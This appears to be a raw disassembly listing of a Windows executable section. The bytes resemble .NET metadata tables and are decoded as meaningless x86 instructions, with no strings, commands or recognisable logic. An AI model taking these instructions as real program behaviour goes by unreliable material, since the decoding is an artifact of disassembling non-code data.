  4051c7:	00 79 03             	add    %bh,0x3(%ecx)
  4051ca:	50                   	push   %eax
  4051cb:	20 00                	and    %al,(%eax)
  4051cd:	00 00                	add    %al,(%eax)
  4051cf:	00 96 00 7b 05 82    	add    %dl,-0x7dfa8500(%esi)
  4051d5:	03 01                	add    (%ecx),%eax
  4051d7:	00 a8 23 00 00 00    	add    %ch,0x23(%eax)
  4051dd:	00 96 00 c7 0d 82    	add    %dl,-0x7df23900(%esi)
  4051e3:	03 02                	add    (%edx),%eax
  4051e5:	00 84 25 00 00 00 00 	add    %al,0x0(%ebp,%eiz,1)
  4051ec:	96                   	xchg   %eax,%esi
  4051ed:	00 ac 0d 82 03 03 00 	add    %ch,0x30382(%ebp,%ecx,1)
  4051f4:	68 27 00 00 00       	push   $0x27
  4051f9:	00 96 00 ad 02 82    	add    %dl,-0x7dfd5300(%esi)
  4051ff:	03 04 00             	add    (%eax,%eax,1),%eax
  405202:	bc 28 00 00 00       	mov    $0x28,%esp
  405207:	00 96 00 5d 09 82    	add    %dl,-0x7df6a300(%esi)
  40520d:	03 05 00 50 29 00    	add    0x295000,%eax
  405213:	00 00                	add    %al,(%eax)
  405215:	00 96 00 e6 03 82    	add    %dl,-0x7dfc1a00(%esi)
  40521b:	03 06                	add    (%esi),%eax
  40521d:	00 94 2c 00 00 00 00 	add    %dl,0x0(%esp,%ebp,1)
  405224:	86 18                	xchg   %bl,(%eax)
  405226:	64 0b 06             	or     %fs:(%esi),%eax
  405229:	00 07                	add    %al,(%edi)
  40522b:	00 a0 2c 00 00 00    	add    %ah,0x2c(%eax)
  405231:	00 96 00 fe 09 88    	add    %dl,-0x77f60200(%esi)
  405237:	03 07                	add    (%edi),%eax
  405239:	00 b8 2d 00 00 00    	add    %bh,0x2d(%eax)
  40523f:	00 86 18 64 0b 06    	add    %al,0x60b6418(%esi)
  405245:	00 07                	add    %al,(%edi)
  405247:	00 c4                	add    %al,%ah
  405249:	2d 00 00 00 00       	sub    $0x0,%eax
  40524e:	96                   	xchg   %eax,%esi
  40524f:	00 eb                	add    %ch,%bl
  405251:	01 82 03 07 00 b4    	add    %eax,-0x4bfff8fd(%edx)
  405257:	2e 00 00             	add    %al,%cs:(%eax)
  40525a:	00 00                	add    %al,(%eax)
  40525c:	96                   	xchg   %eax,%esi
  40525d:	00 ba 0c 82 03 08    	add    %bh,0x803820c(%edx)
  405263:	00 b4 2f 00 00 00 00 	add    %dh,0x0(%edi,%ebp,1)
  40526a:	96                   	xchg   %eax,%esi
  40526b:	00 f7                	add    %dh,%bh
  40526d:	08 82 03 09 00 90    	or     %al,-0x6ffff6fd(%edx)
  405273:	30 00                	xor    %al,(%eax)
  405275:	00 00                	add    %al,(%eax)
  405277:	00 96 00 ad 0c 82    	add    %dl,-0x7df35300(%esi)
  40527d:	03 0a                	add    (%edx),%ecx
  40527f:	00 4c 31 00          	add    %cl,0x0(%ecx,%esi,1)
  405283:	00 00                	add    %al,(%eax)
  405285:	00 96 00 3a 0b 8d    	add    %dl,-0x72f4c600(%esi)
  40528b:	03 0b                	add    (%ebx),%ecx
  40528d:	00 c0                	add    %al,%al
  40528f:	31 00                	xor    %eax,(%eax)
  405291:	00 00                	add    %al,(%eax)
  405293:	00 86 18 64 0b 06    	add    %al,0x60b6418(%esi)
  405299:	00 0b                	add    %cl,(%ebx)
  40529b:	00 cc                	add    %cl,%ah
  40529d:	31 00                	xor    %eax,(%eax)
  40529f:	00 00                	add    %al,(%eax)
  4052a1:	00 86 18 64 0b 91    	add    %al,-0x6ef49be8(%esi)
  4052a7:	03 0b                	add    (%ebx),%ecx
  4052a9:	00 50 32             	add    %dl,0x32(%eax)
  4052ac:	00 00                	add    %al,(%eax)
  4052ae:	00 00                	add    %al,(%eax)
  4052b0:	96                   	xchg   %eax,%esi
  4052b1:	00 10                	add    %dl,(%eax)
  4052b3:	04 5e                	add    $0x5e,%al
  4052b5:	01 0f                	add    %ecx,(%edi)
  4052b7:	00 b0 32 00 00 00    	add    %dh,0x32(%eax)
  4052bd:	00 86 00 34 08 99    	add    %al,-0x66f7cc00(%esi)
  4052c3:	03 11                	add    (%ecx),%edx
  4052c5:	00 e0                	add    %ah,%al
  4052c7:	32 00                	xor    (%eax),%al
  4052c9:	00 00                	add    %al,(%eax)
  4052cb:	00 86 00 4d 08 99    	add    %al,-0x66f7b300(%esi)
  4052d1:	03 12                	add    (%edx),%edx
  4052d3:	00 10                	add    %dl,(%eax)
  4052d5:	33 00                	xor    (%eax),%eax
  4052d7:	00 00                	add    %al,(%eax)
  4052d9:	00 96 00 63 0d 9e    	add    %dl,-0x61f29d00(%esi)
  4052df:	03 13                	add    (%ebx),%edx
  4052e1:	00 a4 34 00 00 00 00 	add    %ah,0x0(%esp,%esi,1)
  4052e8:	96                   	xchg   %eax,%esi
  4052e9:	00 8d 01 9e 03 15    	add    %cl,0x15039e01(%ebp)
  4052ef:	00 58 35             	add    %bl,0x35(%eax)
  4052f2:	00 00                	add    %al,(%eax)
  4052f4:	00 00                	add    %al,(%eax)
  4052f6:	96                   	xchg   %eax,%esi
  4052f7:	00 59 0a             	add    %bl,0xa(%ecx)
  4052fa:	9e                   	sahf
  4052fb:	03 17                	add    (%edi),%edx
  4052fd:	00 0c 36             	add    %cl,(%esi,%esi,1)
  405300:	00 00                	add    %al,(%eax)
  405302:	00 00                	add    %al,(%eax)
  405304:	96                   	xchg   %eax,%esi
  405305:	00 67 0a             	add    %ah,0xa(%edi)
  405308:	82 03 19             	addb   $0x19,(%ebx)
  40530b:	00 a4 36 00 00 00 00 	add    %ah,0x0(%esi,%esi,1)
  405312:	96                   	xchg   %eax,%esi
  405313:	00 8f 0a a5 03 1a    	add    %cl,0x1a03a50a(%edi)
  405319:	00 44 37 00          	add    %al,0x0(%edi,%esi,1)
  40531d:	00 00                	add    %al,(%eax)
  40531f:	00 96 00 75 0a a5    	add    %dl,-0x5af58b00(%esi)
  405325:	03 1c 00             	add    (%eax,%eax,1),%ebx
  405328:	e4 37                	in     $0x37,%al
  40532a:	00 00                	add    %al,(%eax)
  40532c:	00 00                	add    %al,(%eax)
  40532e:	86 18                	xchg   %bl,(%eax)
  405330:	64 0b 06             	or     %fs:(%esi),%eax
  405333:	00 1e                	add    %bl,(%esi)
  405335:	00 ed                	add    %ch,%ch
  405337:	37                   	aaa
  405338:	00 00                	add    %al,(%eax)
  40533a:	00 00                	add    %al,(%eax)
  40533c:	96                   	xchg   %eax,%esi
  40533d:	00 43 01             	add    %al,0x1(%ebx)
  405340:	ac                   	lods   %ds:(%esi),%al
  405341:	03 1e                	add    (%esi),%ebx
  405343:	00 fa                	add    %bh,%dl
  405345:	37                   	aaa
  405346:	00 00                	add    %al,(%eax)
  405348:	00 00                	add    %al,(%eax)
  40534a:	96                   	xchg   %eax,%esi
  40534b:	00 30                	add    %dh,(%eax)
  40534d:	01 ac 03 1e 00 07 38 	add    %ebp,0x3807001e(%ebx,%eax,1)
  405354:	00 00                	add    %al,(%eax)
  405356:	00 00                	add    %al,(%eax)
  405358:	96                   	xchg   %eax,%esi
  405359:	00 56 01             	add    %dl,0x1(%esi)
  40535c:	ac                   	lods   %ds:(%esi),%al
  40535d:	03 1e                	add    (%esi),%ebx
  40535f:	00 14 38             	add    %dl,(%eax,%edi,1)
  405362:	00 00                	add    %al,(%eax)
  405364:	00 00                	add    %al,(%eax)
  405366:	86 18                	xchg   %bl,(%eax)
  405368:	64 0b 06             	or     %fs:(%esi),%eax
  40536b:	00 1e                	add    %bl,(%esi)
  40536d:	00 1d 38 00 00 00    	add    %bl,0x38
  405373:	00 86 18 64 0b 06    	add    %al,0x60b6418(%esi)
  405379:	00 1e                	add    %bl,(%esi)
  40537b:	00 26                	add    %ah,(%esi)
  40537d:	38 00                	cmp    %al,(%eax)
  40537f:	00 00                	add    %al,(%eax)
  405381:	00 96 00 72 0c ac    	add    %dl,-0x53f38e00(%esi)
  405387:	03 1e                	add    (%esi),%ebx
  405389:	00 48 38             	add    %cl,0x38(%eax)
  40538c:	00 00                	add    %al,(%eax)
  40538e:	00 00                	add    %al,(%eax)
  405390:	96                   	xchg   %eax,%esi
  405391:	00 e5                	add    %ah,%ch
  405393:	0e                   	push   %cs
  405394:	ac                   	lods   %ds:(%esi),%al
  405395:	03 1e                	add    (%esi),%ebx
  405397:	00 d5                	add    %dl,%ch
  405399:	38 00                	cmp    %al,(%eax)
  40539b:	00 00                	add    %al,(%eax)
  40539d:	00 96 00 a8 04 ac    	add    %dl,-0x53fb5800(%esi)
  4053a3:	03 1e                	add    (%esi),%ebx
  4053a5:	00 ec                	add    %ch,%ah
  4053a7:	38 00                	cmp    %al,(%eax)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 96 00 71 04 ac    	add    %dl,-0x53fb8f00(%esi)
  4053b1:	03 1e                	add    (%esi),%ebx
  4053b3:	00 f0                	add    %dh,%al
  4053b5:	39 00                	cmp    %eax,(%eax)
  4053b7:	00 00                	add    %al,(%eax)
  4053b9:	00 96 00 66 0c ac    	add    %dl,-0x53f39a00(%esi)
  4053bf:	03 1e                	add    (%esi),%ebx
  4053c1:	00 74 3a 00          	add    %dh,0x0(%edx,%edi,1)
  4053c5:	00 00                	add    %al,(%eax)
  4053c7:	00 96 00 0d 02 ac    	add    %dl,-0x53fdf300(%esi)
  4053cd:	03 1e                	add    (%esi),%ebx
  4053cf:	00 fc                	add    %bh,%ah
  4053d1:	3a 00                	cmp    (%eax),%al
  4053d3:	00 00                	add    %al,(%eax)
  4053d5:	00 96 00 d7 01 00    	add    %dl,0x1d700(%esi)
  4053db:	01 1e                	add    %ebx,(%esi)
  4053dd:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4053e1:	00 00                	add    %al,(%eax)
  4053e3:	00 96 00 e2 07 00    	add    %dl,0x7e200(%esi)
  4053e9:	01 1f                	add    %ebx,(%edi)
  4053eb:	00 7a 3b             	add    %bh,0x3b(%edx)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 00                	add    %al,(%eax)
  4053f2:	86 18                	xchg   %bl,(%eax)
  4053f4:	64 0b 06             	or     %fs:(%esi),%eax
  4053f7:	00 20                	add    %ah,(%eax)
  4053f9:	00 83 3b 00 00 00    	add    %al,0x3b(%ebx)
  4053ff:	00 91 18 6a 0b ac    	add    %dl,-0x53f495e8(%ecx)
  405405:	03 20                	add    (%eax),%esp
  405407:	00 8c 3b 00 00 00 00 	add    %cl,0x0(%ebx,%edi,1)
  40540e:	96                   	xchg   %eax,%esi
  40540f:	00 63 05             	add    %ah,0x5(%ebx)
  405412:	b0 03                	mov    $0x3,%al
  405414:	20 00                	and    %al,(%eax)
  405416:	4c                   	dec    %esp
  405417:	3c 00                	cmp    $0x0,%al
  405419:	00 00                	add    %al,(%eax)
  40541b:	00 96 00 54 05 9e    	add    %dl,-0x61faac00(%esi)
  405421:	03 23                	add    (%ebx),%esp
  405423:	00 44 3d 00          	add    %al,0x0(%ebp,%edi,1)
  405427:	00 00                	add    %al,(%eax)
  405429:	00 96 00 0e 0d 9e    	add    %dl,-0x61f2f200(%esi)
  40542f:	03 25 00 7c 3f 00    	add    0x3f7c00,%esp
  405435:	00 00                	add    %al,(%eax)
  405437:	00 86 18 64 0b 06    	add    %al,0x60b6418(%esi)
  40543d:	00 27                	add    %ah,(%edi)
  40543f:	00 88 3f 00 00 00    	add    %cl,0x3f(%eax)
  405445:	00 91 00 50 07 b8    	add    %dl,-0x47f8b000(%ecx)
  40544b:	03 27                	add    (%edi),%esp
  40544d:	00 e4                	add    %ah,%ah
  40544f:	3f                   	aas
  405450:	00 00                	add    %al,(%eax)
  405452:	00 00                	add    %al,(%eax)
  405454:	96                   	xchg   %eax,%esi
  405455:	00 58 09             	add    %bl,0x9(%eax)
  405458:	c3                   	ret
  405459:	03 29                	add    (%ecx),%ebp
  40545b:	00 31                	add    %dh,(%ecx)
  40545d:	40                   	inc    %eax
  40545e:	00 00                	add    %al,(%eax)
  405460:	00 00                	add    %al,(%eax)
  405462:	86 18                	xchg   %bl,(%eax)
  405464:	64 0b 06             	or     %fs:(%esi),%eax
  405467:	00 2a                	add    %ch,(%edx)
  405469:	00 3a                	add    %bh,(%edx)
  40546b:	40                   	inc    %eax
  40546c:	00 00                	add    %al,(%eax)
  40546e:	00 00                	add    %al,(%eax)
  405470:	96                   	xchg   %eax,%esi
  405471:	08 2f                	or     %ch,(%edi)
  405473:	04 cd                	add    $0xcd,%al
  405475:	00 2a                	add    %ch,(%edx)
  405477:	00 44 40 00          	add    %al,0x0(%eax,%eax,2)
  40547b:	00 00                	add    %al,(%eax)
  40547d:	00 e6                	add    %ah,%dh
  40547f:	01 54 07 c9          	add    %edx,-0x37(%edi,%eax,1)
  405483:	03 2a                	add    (%edx),%ebp
  405485:	00 b5 41 00 00 00    	add    %dh,0x41(%ebp)
  40548b:	00 86 18 64 0b 06    	add    %al,0x60b6418(%esi)
  405491:	00 2b                	add    %ch,(%ebx)
  405493:	00 be 41 00 00 00    	add    %bh,0x41(%esi)
  405499:	00 96 08 2f 04 cd    	add    %dl,-0x32fbd0f8(%esi)
  40549f:	00 2b                	add    %ch,(%ebx)
  4054a1:	00 c8                	add    %cl,%al
  4054a3:	41                   	inc    %ecx
  4054a4:	00 00                	add    %al,(%eax)
  4054a6:	00 00                	add    %al,(%eax)
  4054a8:	e6 01                	out    %al,$0x1
  4054aa:	54                   	push   %esp
  4054ab:	07                   	pop    %es
  4054ac:	c9                   	leave
  4054ad:	03 2b                	add    (%ebx),%ebp
  4054af:	00 72 42             	add    %dh,0x42(%edx)
  4054b2:	00 00                	add    %al,(%eax)
  4054b4:	00 00                	add    %al,(%eax)
  4054b6:	86 18                	xchg   %bl,(%eax)
  4054b8:	64 0b 06             	or     %fs:(%esi),%eax
  4054bb:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4054be:	7b 42                	jnp    0x405502
  4054c0:	00 00                	add    %al,(%eax)
  4054c2:	00 00                	add    %al,(%eax)
  4054c4:	96                   	xchg   %eax,%esi
  4054c5:	08 2f                	or     %ch,(%edi)
  4054c7:	04 cd                	add    $0xcd,%al
  4054c9:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4054cc:	84 42 00             	test   %al,0x0(%edx)
  4054cf:	00 00                	add    %al,(%eax)
  4054d1:	00 e6                	add    %ah,%dh
  4054d3:	01 54 07 c9          	add    %edx,-0x37(%edi,%eax,1)
  4054d7:	03 2c 00             	add    (%eax,%eax,1),%ebp
  4054da:	a8 45                	test   $0x45,%al
  4054dc:	00 00                	add    %al,(%eax)
  4054de:	00 00                	add    %al,(%eax)
  4054e0:	86 18                	xchg   %bl,(%eax)
  4054e2:	64 0b 06             	or     %fs:(%esi),%eax
  4054e5:	00 2d 00 b4 45 00    	add    %ch,0x45b400
  4054eb:	00 00                	add    %al,(%eax)
  4054ed:	00 91 18 6a 0b ac    	add    %dl,-0x53f495e8(%ecx)
  4054f3:	03 2d 00 1b 46 00    	add    0x461b00,%ebp
  4054f9:	00 00                	add    %al,(%eax)
  4054fb:	00 96 08 2f 04 cd    	add    %dl,-0x32fbd0f8(%esi)
  405501:	00 2d 00 24 46 00    	add    %ch,0x462400
  405507:	00 00                	add    %al,(%eax)
  405509:	00 e6                	add    %ah,%dh
  40550b:	01 54 07 c9          	add    %edx,-0x37(%edi,%eax,1)
  40550f:	03 2d 00 6e 47 00    	add    0x476e00,%ebp
  405515:	00 00                	add    %al,(%eax)
  405517:	00 86 18 64 0b 06    	add    %al,0x60b6418(%esi)
  40551d:	00 2e                	add    %ch,(%esi)
  40551f:	00 00                	add    %al,(%eax)
  405521:	00 00                	add    %al,(%eax)
  405523:	00 00                	add    %al,(%eax)
  405525:	00 c6                	add    %al,%dh
  405527:	05 54 07 c9 03       	add    $0x3c90754,%eax
  40552c:	2e 00 77 47          	add    %dh,%cs:0x47(%edi)
  405530:	00 00                	add    %al,(%eax)
  405532:	00 00                	add    %al,(%eax)
  405534:	96                   	xchg   %eax,%esi
  405535:	08 2f                	or     %ch,(%edi)
  405537:	04 cd                	add    $0xcd,%al
  405539:	00 2f                	add    %ch,(%edi)
  40553b:	00 7e 47             	add    %bh,0x47(%esi)
  40553e:	00 00                	add    %al,(%eax)
  405540:	00 00                	add    %al,(%eax)
  405542:	e6 01                	out    %al,$0x1
  405544:	54                   	push   %esp
  405545:	07                   	pop    %es
  405546:	c9                   	leave
  405547:	03 2f                	add    (%edi),%ebp
  405549:	00 9d 47 00 00 00    	add    %bl,0x47(%ebp)
  40554f:	00 86 18 64 0b 06    	add    %al,0x60b6418(%esi)
  405555:	00 30                	add    %dh,(%eax)
  405557:	00 a6 47 00 00 00    	add    %ah,0x47(%esi)
  40555d:	00 96 08 2f 04 cd    	add    %dl,-0x32fbd0f8(%esi)
  405563:	00 30                	add    %dh,(%eax)
  405565:	00 b0 47 00 00 00    	add    %dh,0x47(%eax)
  40556b:	00 e6                	add    %ah,%dh
  40556d:	01 54 07 c9          	add    %edx,-0x37(%edi,%eax,1)
  405571:	03 30                	add    (%eax),%esi
  405573:	00 08                	add    %cl,(%eax)
  405575:	48                   	dec    %eax
  405576:	00 00                	add    %al,(%eax)
  405578:	00 00                	add    %al,(%eax)
  40557a:	86 18                	xchg   %bl,(%eax)
  40557c:	64 0b 06             	or     %fs:(%esi),%eax
  40557f:	00 31                	add    %dh,(%ecx)
  405581:	00 14 48             	add    %dl,(%eax,%ecx,2)
  405584:	00 00                	add    %al,(%eax)
  405586:	00 00                	add    %al,(%eax)
  405588:	96                   	xchg   %eax,%esi
  405589:	00 34 05 d3 03 31 00 	add    %dh,0x3103d3(,%eax,1)
  405590:	04 49                	add    $0x49,%al
  405592:	00 00                	add    %al,(%eax)
  405594:	00 00                	add    %al,(%eax)
  405596:	86 08                	xchg   %cl,(%eax)
  405598:	a0 08 c4 00 32       	mov    0x3200c408,%al
  40559d:	00 0c 49             	add    %cl,(%ecx,%ecx,2)
  4055a0:	00 00                	add    %al,(%eax)
  4055a2:	00 00                	add    %al,(%eax)
  4055a4:	86 08                	xchg   %cl,(%eax)
  4055a6:	ea 0c dd 03 32 00 14 	ljmp   $0x1400,$0x3203dd0c
  4055ad:	49                   	dec    %ecx
  4055ae:	00 00                	add    %al,(%eax)
  4055b0:	00 00                	add    %al,(%eax)
  4055b2:	81 18 64 0b e6 03    	sbbl   $0x3e60b64,(%eax)
  4055b8:	32 00                	xor    (%eax),%al
  4055ba:	2c 49                	sub    $0x49,%al
  4055bc:	00 00                	add    %al,(%eax)
  4055be:	00 00                	add    %al,(%eax)
  4055c0:	96                   	xchg   %eax,%esi
  4055c1:	00 e2                	add    %ah,%dl
  4055c3:	0c f1                	or     $0xf1,%al
  4055c5:	03 34 00             	add    (%eax,%eax,1),%esi
  4055c8:	35 49 00 00 00       	xor    $0x49,%eax
  4055cd:	00 96 00 1e 05 fc    	add    %dl,-0x3fae200(%esi)
  4055d3:	03 35 00 40 49 00    	add    0x494000,%esi
  4055d9:	00 00                	add    %al,(%eax)
  4055db:	00 86 18 64 0b 06    	add    %al,0x60b6418(%esi)
  4055e1:	00 35 00 80 4a 00    	add    %dh,0x4a8000
  4055e7:	00 00                	add    %al,(%eax)
  4055e9:	00 86 00 6b 03 01    	add    %al,0x1036b00(%esi)
  4055ef:	04 35                	add    $0x35,%al
  4055f1:	00 d4                	add    %dl,%ah
  4055f3:	4a                   	dec    %edx
  4055f4:	00 00                	add    %al,(%eax)
  4055f6:	00 00                	add    %al,(%eax)
  4055f8:	96                   	xchg   %eax,%esi
  4055f9:	00 50 0a             	add    %dl,0xa(%eax)
  4055fc:	ac                   	lods   %ds:(%esi),%al
  4055fd:	03 37                	add    (%edi),%esi
  4055ff:	00 f0                	add    %dh,%al
  405601:	4a                   	dec    %edx
  405602:	00 00                	add    %al,(%eax)
  405604:	00 00                	add    %al,(%eax)
  405606:	96                   	xchg   %eax,%esi
  405607:	00 b3 03 ac 03 37    	add    %dh,0x3703ac03(%ebx)
  40560d:	00 0b                	add    %cl,(%ebx)
  40560f:	4b                   	dec    %ebx
  405610:	00 00                	add    %al,(%eax)
  405612:	00 00                	add    %al,(%eax)
  405614:	91                   	xchg   %eax,%ecx
  405615:	18 6a 0b             	sbb    %ch,0xb(%edx)
  405618:	ac                   	lods   %ds:(%esi),%al
  405619:	03 37                	add    (%edi),%esi
  40561b:	00 00                	add    %al,(%eax)
  40561d:	00 00                	add    %al,(%eax)
  40561f:	00 80 00 91 20 48    	add    %al,0x48209100(%eax)
  405625:	0e                   	push   %cs
  405626:	0c 04                	or     $0x4,%al
  405628:	37                   	aaa
  405629:	00 00                	add    %al,(%eax)
  40562b:	00 00                	add    %al,(%eax)
  40562d:	00 80 00 91 20 93    	add    %al,-0x6cdf6f00(%eax)
  405633:	0e                   	push   %cs
  405634:	16                   	push   %ss
  405635:	04 3c                	add    $0x3c,%al
  405637:	00 00                	add    %al,(%eax)
  405639:	00 00                	add    %al,(%eax)
  40563b:	00 80 00 96 20 38    	add    %al,0x38209600(%eax)
  405641:	0e                   	push   %cs
  405642:	1b 04 3d 00 2c 4b 00 	sbb    0x4b2c00(,%edi,1),%eax
  405649:	00 00                	add    %al,(%eax)
  40564b:	00 96 00 cd 00 28    	add    %dl,0x2800cd00(%esi)
  405651:	04 43                	add    $0x43,%al
  405653:	00 4c 4b 00          	add    %cl,0x0(%ebx,%ecx,2)
  405657:	00 00                	add    %al,(%eax)
  405659:	00 96 00 80 00 28    	add    %dl,0x28008000(%esi)
  40565f:	04 46                	add    $0x46,%al
  405661:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  405665:	00 00                	add    %al,(%eax)
  405667:	00 96 00 cd 00 2f    	add    %dl,0x2f00cd00(%esi)
  40566d:	04 49                	add    $0x49,%al
  40566f:	00 20                	add    %ah,(%eax)
  405671:	4c                   	dec    %esp
  405672:	00 00                	add    %al,(%eax)
  405674:	00 00                	add    %al,(%eax)
  405676:	96                   	xchg   %eax,%esi
  405677:	00 05 08 34 01 4d    	add    %al,0x4d013408
  40567d:	00 59 4c             	add    %bl,0x4c(%ecx)
  405680:	00 00                	add    %al,(%eax)
  405682:	00 00                	add    %al,(%eax)
  405684:	91                   	xchg   %eax,%ecx
  405685:	18 6a 0b             	sbb    %ch,0xb(%edx)
  405688:	ac                   	lods   %ds:(%esi),%al
  405689:	03 4e 00             	add    0x0(%esi),%ecx
  40568c:	65 4c                	gs dec %esp
  40568e:	00 00                	add    %al,(%eax)
  405690:	00 00                	add    %al,(%eax)
  405692:	86 18                	xchg   %bl,(%eax)
  405694:	64 0b 06             	or     %fs:(%esi),%eax
  405697:	00 4e 00             	add    %cl,0x0(%esi)
  40569a:	6e                   	outsb  %ds:(%esi),(%dx)
  40569b:	4c                   	dec    %esp
  40569c:	00 00                	add    %al,(%eax)
  40569e:	00 00                	add    %al,(%eax)
  4056a0:	83 00 0a             	addl   $0xa,(%eax)
  4056a3:	00 38                	add    %bh,(%eax)
  4056a5:	04 4e                	add    $0x4e,%al
  4056a7:	00 75 4c             	add    %dh,0x4c(%ebp)
  4056aa:	00 00                	add    %al,(%eax)
  4056ac:	00 00                	add    %al,(%eax)
  4056ae:	83 00 27             	addl   $0x27,(%eax)
  4056b1:	00 38                	add    %bh,(%eax)
  4056b3:	04 4e                	add    $0x4e,%al
  4056b5:	00 7c 4c 00          	add    %bh,0x0(%esp,%ecx,2)
  4056b9:	00 00                	add    %al,(%eax)
  4056bb:	00 83 00 95 00 38    	add    %al,0x38009500(%ebx)
  4056c1:	04 4e                	add    $0x4e,%al
  4056c3:	00 83 4c 00 00 00    	add    %al,0x4c(%ebx)
  4056c9:	00 83 00 b9 00 38    	add    %al,0x3800b900(%ebx)
  4056cf:	04 4e                	add    $0x4e,%al
  4056d1:	00 8a 4c 00 00 00    	add    %cl,0x4c(%edx)
  4056d7:	00 83 00 e2 00 38    	add    %al,0x3800e200(%ebx)
  4056dd:	04 4e                	add    $0x4e,%al
  4056df:	00 91 4c 00 00 00    	add    %dl,0x4c(%ecx)
  4056e5:	00 83 00 f9 00 38    	add    %al,0x3800f900(%ebx)
  4056eb:	04 4e                	add    $0x4e,%al
  4056ed:	00 00                	add    %al,(%eax)
  4056ef:	00 01                	add    %al,(%ecx)
  4056f1:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  4056f4:	00 00                	add    %al,(%eax)
  4056f6:	01 00                	add    %eax,(%eax)
  4056f8:	3c 0a                	cmp    $0xa,%al
  4056fa:	00 00                	add    %al,(%eax)
  4056fc:	01 00                	add    %eax,(%eax)
  4056fe:	3c 0a                	cmp    $0xa,%al
  405700:	00 00                	add    %al,(%eax)
  405702:	01 00                	add    %eax,(%eax)
  405704:	3c 0a                	cmp    $0xa,%al
  405706:	00 00                	add    %al,(%eax)
  405708:	01 00                	add    %eax,(%eax)
  40570a:	3c 0a                	cmp    $0xa,%al
  40570c:	00 00                	add    %al,(%eax)
  40570e:	01 00                	add    %eax,(%eax)
  405710:	3c 0a                	cmp    $0xa,%al
  405712:	00 00                	add    %al,(%eax)
  405714:	01 00                	add    %eax,(%eax)
  405716:	3c 0a                	cmp    $0xa,%al
  405718:	00 00                	add    %al,(%eax)
  40571a:	01 00                	add    %eax,(%eax)
  40571c:	3c 0a                	cmp    $0xa,%al
  40571e:	00 00                	add    %al,(%eax)
  405720:	01 00                	add    %eax,(%eax)
  405722:	3c 0a                	cmp    $0xa,%al
  405724:	00 00                	add    %al,(%eax)
  405726:	01 00                	add    %eax,(%eax)
  405728:	3c 0a                	cmp    $0xa,%al
  40572a:	00 00                	add    %al,(%eax)
  40572c:	01 00                	add    %eax,(%eax)
  40572e:	80 08 00             	orb    $0x0,(%eax)
  405731:	00 02                	add    %al,(%edx)
  405733:	00 3d 0c 00 00 03    	add    %bh,0x300000c
  405739:	00 8d 09 00 00 04    	add    %cl,0x4000009(%ebp)
  40573f:	00 05 04 00 00 01    	add    %al,0x1000004
  405745:	00 8b 08 00 00 02    	add    %cl,0x2000008(%ebx)
  40574b:	00 8d 09 00 00 01    	add    %cl,0x1000009(%ebp)
  405751:	00 ef                	add    %ch,%bh
  405753:	04 00                	add    $0x0,%al
  405755:	00 01                	add    %al,(%ecx)
  405757:	00 ef                	add    %ch,%bh
  405759:	04 00                	add    $0x0,%al
  40575b:	00 01                	add    %al,(%ecx)
  40575d:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  405760:	00 00                	add    %al,(%eax)
  405762:	02 00                	add    (%eax),%al
  405764:	21 0b                	and    %ecx,(%ebx)
  405766:	00 00                	add    %al,(%eax)
  405768:	01 00                	add    %eax,(%eax)
  40576a:	3c 0a                	cmp    $0xa,%al
  40576c:	00 00                	add    %al,(%eax)
  40576e:	02 00                	add    (%eax),%al
  405770:	9e                   	sahf
  405771:	04 00                	add    $0x0,%al
  405773:	00 01                	add    %al,(%ecx)
  405775:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  405778:	00 00                	add    %al,(%eax)
  40577a:	02 00                	add    (%eax),%al
  40577c:	9e                   	sahf
  40577d:	04 00                	add    $0x0,%al
  40577f:	00 01                	add    %al,(%ecx)
  405781:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  405784:	00 00                	add    %al,(%eax)
  405786:	01 00                	add    %eax,(%eax)
  405788:	3c 0a                	cmp    $0xa,%al
  40578a:	00 00                	add    %al,(%eax)
  40578c:	02 00                	add    (%eax),%al
  40578e:	b3 01                	mov    $0x1,%bl
  405790:	00 00                	add    %al,(%eax)
  405792:	01 00                	add    %eax,(%eax)
  405794:	3c 0a                	cmp    $0xa,%al
  405796:	00 00                	add    %al,(%eax)
  405798:	02 00                	add    (%eax),%al
  40579a:	b3 01                	mov    $0x1,%bl
  40579c:	00 00                	add    %al,(%eax)
  40579e:	01 00                	add    %eax,(%eax)
  4057a0:	55                   	push   %ebp
  4057a1:	0e                   	push   %cs
  4057a2:	00 00                	add    %al,(%eax)
  4057a4:	01 00                	add    %eax,(%eax)
  4057a6:	38 0d 00 00 01 00    	cmp    %cl,0x10000
  4057ac:	3c 0a                	cmp    $0xa,%al
  4057ae:	00 00                	add    %al,(%eax)
  4057b0:	02 00                	add    (%eax),%al
  4057b2:	78 01                	js     0x4057b5
  4057b4:	00 00                	add    %al,(%eax)
  4057b6:	03 00                	add    (%eax),%eax
  4057b8:	31 0b                	xor    %ecx,(%ebx)
  4057ba:	00 00                	add    %al,(%eax)
  4057bc:	01 00                	add    %eax,(%eax)
  4057be:	3c 0a                	cmp    $0xa,%al
  4057c0:	00 00                	add    %al,(%eax)
  4057c2:	02 00                	add    (%eax),%al
  4057c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4057c5:	01 00                	add    %eax,(%eax)
  4057c7:	00 01                	add    %al,(%ecx)
  4057c9:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 00                	add    (%eax),%al
  4057d0:	78 01                	js     0x4057d3
  4057d2:	00 00                	add    %al,(%eax)
  4057d4:	01 00                	add    %eax,(%eax)
  4057d6:	3f                   	aas
  4057d7:	04 00                	add    $0x0,%al
  4057d9:	00 02                	add    %al,(%edx)
  4057db:	00 50 0c             	add    %dl,0xc(%eax)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	01 00                	add    %eax,(%eax)
  4057e2:	61                   	popa
  4057e3:	0c 00                	or     $0x0,%al
  4057e5:	00 01                	add    %al,(%ecx)
  4057e7:	00 f8                	add    %bh,%al
  4057e9:	0c 00                	or     $0x0,%al
  4057eb:	00 01                	add    %al,(%ecx)
  4057ed:	00 f8                	add    %bh,%al
  4057ef:	0c 00                	or     $0x0,%al
  4057f1:	00 01                	add    %al,(%ecx)
